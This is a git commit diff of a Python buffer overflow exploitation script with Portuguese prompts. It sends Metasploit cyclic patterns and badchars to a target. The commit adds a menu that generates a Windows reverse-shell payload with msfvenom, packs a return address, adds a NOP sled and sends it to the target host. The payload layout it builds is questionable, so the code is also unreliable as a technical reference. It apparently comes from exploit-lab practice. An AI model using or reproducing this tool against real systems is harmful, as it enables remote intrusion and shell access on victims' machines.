b9eefadedd6330ed743696c3325a231d2a476700
theozin <110571215+teteco@users.noreply.github.com>
2023-05-26 16:14:37 -0300

    Update buffer_overflow_fuzzing.py

--- buffer_overflow_fuzzing.py
+++ buffer_overflow_fuzzing.py
@@ -1,18 +1,18 @@
 import socket
 import os
+import struct
 
 def send_payload(target_ip, target_port, payload):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
         sock.connect((target_ip, target_port))
-        sock.send(payload.encode())
+        sock.send(payload)
         response = sock.recv(1024)
         print(response.decode())
     except Exception as e:
         print(f"Não foi possível conectar-se ao alvo: {target_ip}:{target_port}")
         print(f"Mensagem de erro: {str(e)}")
-        print(f"Valor do padrão gerado: {payload}")
 
     sock.close()
 
@@ -23,10 +23,17 @@ def create_pattern_menu():
     create_pattern_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {pattern_length}"
     pattern = os.popen(create_pattern_cmd).read().strip()
 
-    target_ip = input("Informe o endereço IP do alvo: ")
-    target_port = int(input("Informe a porta do alvo: "))
+    print("\nPayload criado:")
+    print(pattern)
 
-    send_payload(target_ip, target_port, pattern.encode())
+    proceed = input("Deseja continuar com o ataque? (s/n): ")
+    if proceed.lower() == "s":
+        target_ip = input("Informe o endereço IP do alvo: ")
+        target_port = int(input("Informe a porta do alvo: "))
+
+        send_payload(target_ip, target_port, pattern.encode())
+    else:
+        print("Ataque cancelado.")
 
 def determine_offset_menu():
     pattern = input("Informe o padrão enviado anteriormente: ")
@@ -42,32 +49,74 @@ def determine_offset_menu():
     target_port = int(input("Informe a porta do alvo: "))
 
     # Valor fixo "BBBB"
-    payload = "BBBB"
+    payload = b"BBBB"
 
     badchars = input("Informe os badchars a serem enviados: ")
-    payload += badchars
+    payload += badchars.encode()
 
-    send_payload(target_ip, target_port, payload.encode())
+    send_payload(target_ip, target_port, payload)
+
+def create_payload_menu():
+    print("-- Seleção de Payload --")
+    print("1. Reverse Shell")
+
+    choice = input("Escolha um payload: ")
+    if choice == "1":
+        lhost = input("Informe o endereço IP do atacante: ")
+        lport = input("Informe a porta do atacante: ")
+        badchars = input("Informe os badchars encontrados: ")
+
+        # Comando para criar o payload reverse shell com o msfvenom
+        create_payload_cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c"
+        shellcode = os.popen(create_payload_cmd).read().strip()
+
+        target_ip = input("Informe o endereço IP do alvo: ")
+        target_port = int(input("Informe a porta do alvo: "))
+
+        eip_address = input("Informe o endereço de retorno encontrado (formato: 0x10090c83): ")
+        eip_value = struct.pack("<I", int(eip_address, 16))
+
+        nop_sled = b"\x90" * 16
+
+        payload = shellcode.encode() + nop_sled + eip_value + badchars.encode()
+
+        print("\nPayload criado:")
+        print(payload)
+
+        proceed = input("Deseja continuar com o ataque? (s/n): ")
+        if proceed.lower() == "s":
+            send_payload(target_ip, target_port, payload)
+        else:
+            print("Ataque cancelado.")
+    else:
+        print("Opção inválida!")
 
 def main_menu():
     while True:
-        print("\n-- Menu --")
-        print("1. Criar padrão e enviar para o alvo")
-        print("2. Determinar offset e enviar badchars")
-        print("3. Sair")
+        print("\n-- Menu Principal --")
+        print("1. Criar padrão")
+        print("2. Determinar offset")
+        print("3. Criar payload personalizado")
+        print("4. Sair")
 
         choice = input("Escolha uma opção: ")
+
         if choice == "1":
             create_pattern_menu()
         elif choice == "2":
             determine_offset_menu()
         elif choice == "3":
+            create_payload_menu()
+        elif choice == "4":
+            print("Goodbye!")
             break
         else:
             print("Opção inválida!")
 
-def main():
-    main_menu()
-
 if __name__ == "__main__":
-    main()
+    try:
+        while True:
+            os.system('clear')
+            main_menu()
+    except KeyboardInterrupt:
+        print("\nGoodbye!")
